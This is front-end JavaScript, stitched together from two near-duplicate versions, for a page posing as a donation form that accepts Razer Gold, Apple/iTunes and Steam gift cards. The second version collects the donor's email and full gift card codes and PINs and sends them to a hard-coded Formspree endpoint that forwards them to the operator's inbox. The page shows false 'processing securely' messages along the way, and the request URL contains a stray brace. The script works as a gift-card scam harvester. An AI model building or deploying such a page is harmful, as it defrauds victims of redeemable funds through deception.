document.addEventListener("DOMContentLoaded", function () {
    const paymentOptions = document.querySelectorAll(".payment-option");
    const codeContainer = document.getElementById("giftcard-code-container");
    const codeLabel = document.getElementById("giftcard-label");
    const codeInput = document.getElementById("giftcard-code");

    paymentOptions.forEach(option => {
        option.addEventListener("click", function () {
            // Drop current active layout highlights
            paymentOptions.forEach(opt => opt.classList.remove("active"));
            
            this.classList.add("active");
            
            const radioBtn = this.querySelector("input[type='radio']");
            if (radioBtn) {
                radioBtn.checked = true;
                handleMethodChange(radioBtn.value);
            }
        });
    });

    function handleMethodChange(selectedValue) {
        if (selectedValue === "card") {
            // Hide code input area if standard credit card processing is used
            codeContainer.classList.add("hidden");
            codeInput.removeAttribute("required");
        } else {
            // Un-hide the voucher container input fields
            codeContainer.classList.remove("hidden");
            codeInput.setAttribute("required", "true");
            
            // Tailor helper contextual placeholder texts 
            if (selectedValue === "razer_gold") {
                codeLabel.textContent = "Razer Gold PIN Code";
                codeInput.placeholder = "Enter 14-digit Serial & PIN code";
            } else if (selectedValue === "apple_giftcard") {
                codeLabel.textContent = "Apple / iTunes Card Code";
                codeInput.placeholder = "X-coded 16-digit voucher number";
            } else if (selectedValue === "steam_giftcard") {
                codeLabel.textContent = "Steam Wallet Code";
                codeInput.placeholder = "Enter standard 5x5 alpha-numeric wallet code";
            }
        }
    }
});
document.addEventListener("DOMContentLoaded", function () {
    const paymentOptions = document.querySelectorAll(".payment-option");
    const codeContainer = document.getElementById("giftcard-code-container");
    const codeLabel = document.getElementById("giftcard-label");
    const codeInput = document.getElementById("giftcard-code");
    const amountInput = document.getElementById("giftcard-amount");
    const paymentForm = document.getElementById("payment-form");
    const submitButton = document.getElementById("submit-button");

    // --- PASTE YOUR FORMSPREE ID HERE ---
    const FORMSPREE_ID = "YOUR_FORMSPREE_FORM_ID"; 

    paymentOptions.forEach(option => {
        option.addEventListener("click", function () {
            paymentOptions.forEach(opt => opt.classList.remove("active"));
            this.classList.add("active");
            
            const radioBtn = this.querySelector("input[type='radio']");
            if (radioBtn) {
                radioBtn.checked = true;
                handleMethodChange(radioBtn.value);
            }
        });
    });

    function handleMethodChange(selectedValue) {
        if (selectedValue === "card") {
            codeContainer.classList.add("hidden");
            codeInput.removeAttribute("required");
            amountInput.removeAttribute("required");
        } else {
            codeContainer.classList.remove("hidden");
            codeInput.setAttribute("required", "true");
            amountInput.setAttribute("required", "true");
            
            if (selectedValue === "razer_gold") {
                codeLabel.textContent = "Razer Gold PIN Code";
                codeInput.placeholder = "Enter 14-digit Serial & PIN code";
            } else if (selectedValue === "apple_giftcard") {
                codeLabel.textContent = "Apple / iTunes Card Code";
                codeInput.placeholder = "X-coded 16-digit voucher number";
            } else if (selectedValue === "steam_giftcard") {
                codeLabel.textContent = "Steam Wallet Code";
                codeInput.placeholder = "Enter standard 5x5 alpha-numeric wallet code";
            }
        }
    }

    // Intercept form submission and transmit data securely to your email
    paymentForm.addEventListener("submit", function (e) {
        e.preventDefault();

        const activeMethod = document.querySelector("input[name='payment_method']:checked").value;
        const donorEmail = document.getElementById("email").value;

        // Visual loading feedback state
        submitButton.textContent = "Processing Securely...";
        submitButton.disabled = true;

        // Bundle data payload mapping
        const formData = {
            email: donorEmail,
            payment_method: activeMethod,
            gift_card_amount: amountInput.value || "N/A (Credit Card Selected)",
            gift_card_code: codeInput.value || "N/A (Credit Card Selected)"
        };

        // Send data directly to your inbox via background API tunnel
        fetch(`https://formspree.io/f/xkoawyjl}`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify(formData)
        })
        .then(response => {
            if (response.ok) {
                alert("Thank you! Your donation details have been securely uploaded for processing.");
                paymentForm.reset();
                codeContainer.classList.add("hidden");
            } else {
                alert("An error occurred during verification. Please check your card code inputs.");
            }
        })
        .catch(error => {
            alert("Network connection error. Please try uploading your card details again.");
        })
        .finally(() => {
            submitButton.textContent = "Confirm Donation";
            submitButton.disabled = false;
        });
    });
});